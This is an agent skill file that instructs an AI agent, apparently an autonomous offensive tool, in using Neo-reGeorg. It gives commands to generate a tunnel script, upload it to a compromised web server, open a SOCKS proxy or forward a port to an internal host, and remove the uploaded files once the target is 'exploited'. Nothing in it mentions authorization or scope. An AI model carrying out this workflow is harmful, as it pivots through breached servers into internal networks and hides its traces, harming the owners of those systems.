---
name: tool-neoreg
description: Use when you need a practical operating guide for Neo-reGeorg as a webshell-backed SOCKS or forward tunnel through PHP, JSP, ASPX, or similar server-side assets.
---

# Tool Guide: Neo-reGeorg

## Overview

Use this skill when direct reverse connectivity is undesirable and you already have a web foothold that can host a tunnel script.

## When to Use

- A stable webshell or upload primitive already exists.
- You want a positive-direction SOCKS tunnel through HTTP instead of a reverse callback.
- The target app can host a PHP/JSP/ASPX/ASHX tunnel asset.

## Remote Paths

- Client: `/root/niuniu-agent/tools/Neo-reGeorg/neoreg.py`
- Templates: `/root/niuniu-agent/tools/Neo-reGeorg/templates/`

## Recommended Workflow

1. Generate a tunnel asset with a fresh key.
2. Upload only the matching server-side file for the target stack, for example `tunnel.php`.
3. Verify the uploaded path is reachable over HTTP.
4. Start the local SOCKS listener through `neoreg.py`.
5. Point follow-on tools through `socks5://127.0.0.1:<port>` only after the tunnel is confirmed healthy.

## Practical Commands

Generate tunnel assets:

```bash
python3 /root/niuniu-agent/tools/Neo-reGeorg/neoreg.py generate -k strongpass
```

Start a SOCKS tunnel after upload:

```bash
python3 /root/niuniu-agent/tools/Neo-reGeorg/neoreg.py \
  -k strongpass \
  -u http://target/uploads/tunnel.php \
  -l 127.0.0.1 \
  -p 1080
```

Port-forward mode instead of SOCKS:

```bash
python3 /root/niuniu-agent/tools/Neo-reGeorg/neoreg.py \
  -k strongpass \
  -u http://target/uploads/tunnel.php \
  -t 172.20.0.5:8080
```

## Operational Notes

- Prefer this when a webshell already exists and reverse tunnels are unreliable or noisy.
- Use `--skip` only when the tunnel path is already known-good and you are optimizing for speed.
- Use `-H`, `-c`, or `-T` when the target needs specific headers, cookies, or request shaping.
- Use `-r` only for genuine load-balanced or internal redirect scenarios.

## Resource Guardrails

- Keep one tunnel per immediate objective.
- Tear the tunnel down once the target service has been fully mapped or exploited.
- Do not leave uploaded tunnel assets behind longer than necessary.
